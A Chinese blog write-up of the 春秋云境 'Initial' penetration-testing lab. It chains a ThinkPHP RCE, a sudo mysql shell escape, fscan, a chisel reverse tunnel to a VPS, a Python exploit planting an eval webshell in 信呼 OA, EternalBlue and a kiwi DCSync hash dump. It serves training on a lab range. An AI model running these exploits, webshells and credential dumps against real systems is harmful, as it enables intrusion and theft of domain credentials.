
<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8" />
    <title>春秋云境 Initial | 雲流のLowest World</title>
    <meta name="author" content="C1oudfL0w0" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
    <!-- cdn挂掉的时候要可以引用本地 -->
<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
<script src="/blog/js/vue.global.prod.min.js"></script>


<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />


<link rel="stylesheet" href="/blog/css/all.min.css" />
<link rel="stylesheet" href="/blog/css/fonts.min.css" />
<link rel="stylesheet" href="/blog/css/search.css" />
<script> const mixins = {}; </script>

<!-- 引入jQuery-->
<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
<script src="/blog/js/jquery.min.js"></script>

<!--改成了prismjs高亮-->

<script src="/blog/js/lib/prism.js"></script>
<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />



<script src="/blog/js/lib/preview.js"></script>










<script src="/blog/js/lib/home.js"></script>

<link rel="stylesheet" href="/blog/css/main.css" />
<!-- 引入不蒜子-->

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
<!-- 代码语言 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
<!-- 代码块复制 -->
<!-- 引入clipboard -->

<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
<!-- 代码块收缩 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
<!-- 代码块折行 -->
<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
</head>

<body>
    <!--flag{never_g0nna g1ve_you up}-->

    <!-- 页面点击特效 -->
    <script type="text/javascript" src="/blog/js/love-click.js"></script>

    <!-- 浏览器标题 -->
    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>

    <!-- 动态背景 -->
    

    <!--文章目录-->
    
    <div id="toc" class="toc-article">
    <h3><i class="fas fa-stream"></i>  目录</h3>
      <div class="toc-title"></div>
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#thinkphp-5-0-23-RCE"><span class="toc-number">2.</span> <span class="toc-text">thinkphp 5.0.23 RCE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">3.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%89%AB%E6%8F%8F"><span class="toc-number">4.</span> <span class="toc-text">内网扫描</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%A3%E7%90%86"><span class="toc-number">5.</span> <span class="toc-text">代理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E5%91%BCnday"><span class="toc-number">6.</span> <span class="toc-text">信呼nday</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MS17-010-amp-DCSync"><span class="toc-number">7.</span> <span class="toc-text">MS17-010 &amp; DCSync</span></a></li></ol>
    </div>
  

    <!--返回顶部-->
    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
        <a title="返回顶部">↑</a>
    </div>
    <script src="/blog/js/totop.js"></script>

    <div id="layout">
        
            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
            
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>第一次加载文章图片可能会花费较长时间</p>
                    <p>要不挂个梯子试试？（x</p>
                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
                    <img src="/blog/images/loading.gif" />
                </div>
            </div>
        </transition>
        <transition name="into">
            <div id="main" v-show="!loading">
                <nav id="menu" ref="menu">
    <div class="desktop-menu">
        <a class="title" href="/blog/">
            <span>雲流のLOWEST WORLD</span>
        </a>
        
        <a href="/blog/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/blog/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/blog/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/blog/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/blog/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
        <a href="/blog/links">
            <i class="fa-solid fa-link fa-fw"></i>
            <span>&ensp;Links</span>
        </a>
        
        <a href="/blog/search">
            <i class="fa-solid fa-search fa-fw"></i>
            <span>&ensp;Search</span>
        </a>
        
    </div>
    <div id="mobile-menu">
        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
        <div class="title" @click="showMenu = !showMenu">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;雲流のLOWEST WORLD</span>
        </div>
        <transition name="slide">
        <div class="items" v-show="showMenu">
            
            <a href="/blog/">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-house fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                </div>
            </a>
            
            <a href="/blog/about">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-id-card fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                </div>
            </a>
            
            <a href="/blog/archives">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-box-archive fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                </div>
            </a>
            
            <a href="/blog/categories">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-bookmark fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                </div>
            </a>
            
            <a href="/blog/tags">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-tags fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                </div>
            </a>
            
            <a href="/blog/links">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-link fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
                </div>
            </a>
            
            <a href="/blog/search">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-search fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
                </div>
            </a>
            
        </div>
        </transition>
    </div>
</nav>

                <div class="article">
    <div>
        <h1>春秋云境 Initial</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2025/2/24
        </span>
        
        <span class="category">
            <a href="/blog/categories/%E6%B8%97%E9%80%8F/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                渗透
            </a>
        </span>
        
        
        <span class="tags">
            <span class="icon">
                <i class="fa-solid fa-tags fa-fw"></i>
            </span>
            
            <span class="tag">
                
                <a href="/blog/tags/CVE/" style="color: #00a596">CVE</a>
            </span>
            
            <span class="tag">
                
                <a href="/blog/tags/ThinkPHP/" style="color: #00a596">ThinkPHP</a>
            </span>
            
            <span class="tag">
                
                <a href="/blog/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/" style="color: #00bcd4">春秋云境</a>
            </span>
            
        </span>
        
        <!--文章字数统计-->
        
            
<div style="margin-top:10px;">
    <span class="post-time">
      <span class="post-meta-item-icon">
        <i class="fa fa-keyboard-o"></i>
        <span class="post-meta-item-text">  字数统计: </span>
        <!-- 安装插件npm install hexo-wordcount --save -->
        <span class="post-count">1.5k字</span>
      </span>
    </span>

    <span class="post-time">
      &nbsp; | &nbsp;
      <span class="post-meta-item-icon">
        <i class="fa fa-hourglass-half"></i>
        <span class="post-meta-item-text">  阅读时长: </span>
        <span class="post-count">6分</span>
      </span>
    </span>
    
    <!--不蒜子统计访问数-->
    <span id="busuanzi_container_page_pv">
    &nbsp; | &nbsp;
    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
    </span>
</div>

          
    </div>
    
    <div class="content" v-pre>
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>感谢 <a target="_blank" rel="noopener" href="https://dexterjie.github.io/">@Dexterjie</a> 快过期的沙砾支持</p>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://fushuling.com/index.php/2023/08/27/%e6%98%a5%e7%a7%8b%e4%ba%91%e5%a2%83%c2%b7initial/">https://fushuling.com/index.php/2023/08/27/%e6%98%a5%e7%a7%8b%e4%ba%91%e5%a2%83%c2%b7initial/</a></p>
<span id="more"></span>

<hr>
<h1 id="thinkphp-5-0-23-RCE"><a href="#thinkphp-5-0-23-RCE" class="headerlink" title="thinkphp 5.0.23 RCE"></a>thinkphp 5.0.23 RCE</h1><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/image-20250224113527285.png" alt="image-20250224113527285"></p>
<p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/image-20250224113814420.png" alt="image-20250224113814420"></p>
<p>这么大一个tp的标，直接开扫</p>
<p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/image-20250224114119033.png" alt="image-20250224114119033"></p>
<p>getshell 完直接蚁剑连上去</p>
<hr>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>先看下 suid 权限</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-user</span> root <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-print</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/image-20250224114409155.png" alt="image-20250224114409155"></p>
<p>没啥可利用的，看一下 sudo</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/image-20250224114454204.png" alt="image-20250224114454204"></p>
<p>那么就是 mysql 提权</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> mysql <span class="token parameter variable">-e</span> <span class="token string">'\! /bin/sh'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/image-20250224114659322.png" alt="image-20250224114659322"></p>
<p>拿到第一段flag：<code>flag&#123;60b53231-</code></p>
<hr>
<h1 id="内网扫描"><a href="#内网扫描" class="headerlink" title="内网扫描"></a>内网扫描</h1><p>接下来打内网，ifconfig 看一下内网网段，传 fscan 给执行权限扫内网</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> mysql <span class="token parameter variable">-e</span> <span class="token string">'\! chmod 777 ./fscan'</span>
<span class="token function">ifconfig</span>
./fscan <span class="token parameter variable">-h</span> <span class="token number">172.22</span>.1.15/24<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/image-20250224115304032.png" alt="image-20250224115304032"></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">172.22</span>.1.18:445 <span class="token function">open</span>
<span class="token number">172.22</span>.1.18:3306 <span class="token function">open</span>
<span class="token number">172.22</span>.1.21:445 <span class="token function">open</span>
<span class="token number">172.22</span>.1.2:445 <span class="token function">open</span>
<span class="token number">172.22</span>.1.18:139 <span class="token function">open</span>
<span class="token number">172.22</span>.1.2:139 <span class="token function">open</span>
<span class="token number">172.22</span>.1.21:139 <span class="token function">open</span>
<span class="token number">172.22</span>.1.18:135 <span class="token function">open</span>
<span class="token number">172.22</span>.1.21:135 <span class="token function">open</span>
<span class="token number">172.22</span>.1.2:135 <span class="token function">open</span>
<span class="token number">172.22</span>.1.18:80 <span class="token function">open</span>
<span class="token number">172.22</span>.1.15:80 <span class="token function">open</span>
<span class="token number">172.22</span>.1.2:88 <span class="token function">open</span>
<span class="token number">172.22</span>.1.15:22 <span class="token function">open</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span><span class="token number">172.22</span>.1.18
   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span>XIAORANG-OA01
   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span><span class="token number">172.22</span>.1.18
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span><span class="token number">172.22</span>.1.2
   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span>DC01
   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span><span class="token number">172.22</span>.1.2
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span><span class="token number">172.22</span>.1.21
   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span>XIAORANG-WIN7
   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span><span class="token number">172.22</span>.1.21
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> MS17-010 <span class="token number">172.22</span>.1.21    <span class="token punctuation">(</span>Windows Server <span class="token number">2008</span> R2 Enterprise <span class="token number">7601</span> Service Pack <span class="token number">1</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetBios <span class="token number">172.22</span>.1.2      <span class="token punctuation">[</span>+<span class="token punctuation">]</span> DC:DC01.xiaorang.lab             Windows Server <span class="token number">2016</span> Datacenter <span class="token number">14393</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> OsInfo <span class="token number">172.22</span>.1.2    <span class="token punctuation">(</span>Windows Server <span class="token number">2016</span> Datacenter <span class="token number">14393</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetBios <span class="token number">172.22</span>.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server <span class="token number">2008</span> R2 Enterprise <span class="token number">7601</span> Service Pack <span class="token number">1</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetBios <span class="token number">172.22</span>.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server <span class="token number">2012</span> R2 Datacenter <span class="token number">9600</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://172.22.1.15        code:200 len:5578   title:Bootstrap Material Admin
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://172.22.1.18        code:302 len:0      title:None 跳转url: http://172.22.1.18?m<span class="token operator">=</span>login
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://172.22.1.18?m<span class="token operator">=</span>login code:200 len:4012   title:信呼协同办公系统
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> PocScan http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h1 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h1><p>用 chisel 建立内网隧道方便本地进行内网资源访问</p>
<p>在vps上运行：(记得安全组策略开端口)</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./chisel server <span class="token parameter variable">-p</span> <span class="token number">33322</span> <span class="token parameter variable">--reverse</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在这台已经getshell的机器上运行：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./chisel client vpsip:33322 R:0.0.0.0:44543:socks<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/image-20250224120820231.png" alt="image-20250224120820231"></p>
<p>然后连接 vps:44543 的 socks5 代理</p>
<p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/image-20250224120942648.png" alt="image-20250224120942648"></p>
<p>最后即可在本地访问内网资源：</p>
<p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/image-20250224121044357.png" alt="image-20250224121044357"></p>
<hr>
<h1 id="信呼nday"><a href="#信呼nday" class="headerlink" title="信呼nday"></a>信呼nday</h1><p>首先要在 kali 上也建立一下socks5访问</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/proxychains4.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/image-20250224121351479.png" alt="image-20250224121351479"></p>
<p>信呼v2.2.8，搜一下有：<a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-POC/blob/master/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E4%BF%A1%E5%91%BCOA%20qcloudCosAction.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md">https://github.com/Threekiii/Awesome-POC/blob/master/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E4%BF%A1%E5%91%BCOA%20qcloudCosAction.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md</a></p>
<p>先尝试爆破账密，bp也记得挂socks代理，然后浏览器走bp代理就能套代理了，得到 admin:admin123</p>
<p>那么上传1.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/image-20250224122514619.png" alt="image-20250224122514619"></p>
<p>拿到现在的 fileid 为 10，下一个文件就是11了</p>
<p>那么同样的操作在 kali 上准备一个 1.php</p>
<p>同目录下准备 poc 脚本：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 1.php为webshell</span>

<span class="token comment"># 需要修改以下内容：</span>
<span class="token comment"># url_pre = 'http://&lt;IP>/'</span>
<span class="token comment"># 'adminuser': '&lt;ADMINUSER_BASE64>',</span>
<span class="token comment"># 'adminpass': '&lt;ADMINPASS_BASE64>',</span>

<span class="token keyword">import</span> requests

session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
url_pre <span class="token operator">=</span> <span class="token string">'http://172.22.1.18/'</span>
url1 <span class="token operator">=</span> url_pre <span class="token operator">+</span> <span class="token string">'?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953'</span>
url2 <span class="token operator">=</span> url_pre <span class="token operator">+</span> <span class="token string">'/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913'</span>
url3 <span class="token operator">=</span> url_pre <span class="token operator">+</span> <span class="token string">'/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11'</span>
data1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">'rempass'</span><span class="token punctuation">:</span> <span class="token string">'0'</span><span class="token punctuation">,</span>
    <span class="token string">'jmpass'</span><span class="token punctuation">:</span> <span class="token string">'false'</span><span class="token punctuation">,</span>
    <span class="token string">'device'</span><span class="token punctuation">:</span> <span class="token string">'1625884034525'</span><span class="token punctuation">,</span>
    <span class="token string">'ltype'</span><span class="token punctuation">:</span> <span class="token string">'0'</span><span class="token punctuation">,</span>
    <span class="token string">'adminuser'</span><span class="token punctuation">:</span> <span class="token string">'YWRtaW4='</span><span class="token punctuation">,</span>
    <span class="token string">'adminpass'</span><span class="token punctuation">:</span> <span class="token string">'YWRtaW4xMjM='</span><span class="token punctuation">,</span>
    <span class="token string">'yanzm'</span><span class="token punctuation">:</span> <span class="token string">''</span>    
<span class="token punctuation">&#125;</span>

r <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url1<span class="token punctuation">,</span> data<span class="token operator">=</span>data1<span class="token punctuation">)</span>
r <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url2<span class="token punctuation">,</span> files<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'1.php'</span><span class="token punctuation">,</span> <span class="token string">'r+'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
filepath <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'filepath'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
filepath <span class="token operator">=</span> <span class="token string">"/"</span> <span class="token operator">+</span> filepath<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.uptemp'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'.php'</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>filepath<span class="token punctuation">)</span>
<span class="token builtin">id</span> <span class="token operator">=</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span>
url3 <span class="token operator">=</span> url_pre <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f'/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">id</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span>
r <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url3<span class="token punctuation">)</span>
r <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url_pre <span class="token operator">+</span> filepath <span class="token operator">+</span> <span class="token string">"?1=system('dir');"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后运行</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains4 python3 poc.py <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/image-20250224122842289.png" alt="image-20250224122842289"></p>
<p>访问写马的目录看看</p>
<p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/image-20250224122943638.png" alt="image-20250224122943638"></p>
<p>成功getshell了，是 system 权限</p>
<p>接下来在蚁剑上同样配置socks代理进行连接</p>
<p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/image-20250224123150450.png" alt="image-20250224123150450"></p>
<p>连马找flag</p>
<p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/image-20250224123320660.png" alt="image-20250224123320660"></p>
<p>flag02: <code>2ce3-4813-87d4-</code></p>
<hr>
<h1 id="MS17-010-amp-DCSync"><a href="#MS17-010-amp-DCSync" class="headerlink" title="MS17-010 &amp; DCSync"></a>MS17-010 &amp; DCSync</h1><p>接下来打内网的 MS17-010 服务器，这个搜一下可以知道是永恒之蓝</p>
<p>msf上有，遂直接一把梭，参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/ElsonHY/article/details/109939420">https://blog.csdn.net/ElsonHY/article/details/109939420</a></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains4 msfconsole
search ms17-010<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/image-20250224124336985.png" alt="image-20250224124336985"></p>
<p>直接打了</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use exploit/windows/smb/ms17_010_eternalblue
<span class="token builtin class-name">set</span> payload windows/x64/meterpreter/bind_tcp_uuid
<span class="token builtin class-name">set</span> RHOSTS <span class="token number">172.22</span>.1.21
exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/image-20250224124850453.png" alt="image-20250224124850453"></p>
<p>拿到权限后可以用 creds_all 等命令收集内网凭据，而我们控制的这台机器是有 DCSync 的权限的(因为这个是DC1，也就是域控制器)，所以能直接从域控上导出Hash</p>
<p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/image-20250224125846463.png" alt="image-20250224125846463"></p>
<blockquote>
<p><strong>DCSync攻击:</strong><br>DCSync的原理是利用域控制器之间的数据同步复制<br>DCSync是AD域渗透中常用的凭据窃取手段，默认情况下，域内不同DC每隔15分钟会进行一次数据同步，当一个DC从另外一个DC同步数据时，发起请求的一方会通过目录复制协议（MS-  DRSR）来对另外一台域控中的域用户密码进行复制，DCSync就是利用这个原理，“模拟”DC向真实DC发送数据同步请求，获取用户凭据数据，由于这种攻击利用了Windows RPC协议，并不需要登陆域控或者在域控上落地文件，避免触发EDR告警，因此DCSync时一种非常隐蔽的凭据窃取方式</p>
</blockquote>
<blockquote>
<p><strong>DCSync 攻击前提:</strong><br>想进行DCSync 攻击，必须获得以下任一用户的权限：<br>Administrators 组内的用户<br>Domain Admins 组内的用户<br>Enterprise Admins 组内的用户域控制器的计算机帐户<br>即：默认情况下域管理员组具有该权限</p>
</blockquote>
<p>这里我们用永恒之蓝打完本来就是 system 权限，然后我们<code>load kiwi</code>启用猕猴桃，抓取用户的hash</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">load kiwi
kiwi_cmd <span class="token string">"lsadump::dcsync /domain:xiaorang.lab /all /csv"</span> <span class="token builtin class-name">exit</span>
<span class="token comment"># 导出域内所有用户的信息，包括哈希值</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/image-20250224125323059.png" alt="image-20250224125323059"></p>
<p>抓到了 Administrator 的 hash，之前扫出来 .2 的 445 端口开放，利用 smb 哈希传递，直接用 kali 自带的 crackmapexec，参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42077227/article/details/130279040">https://blog.csdn.net/qq_42077227/article/details/130279040</a></p>
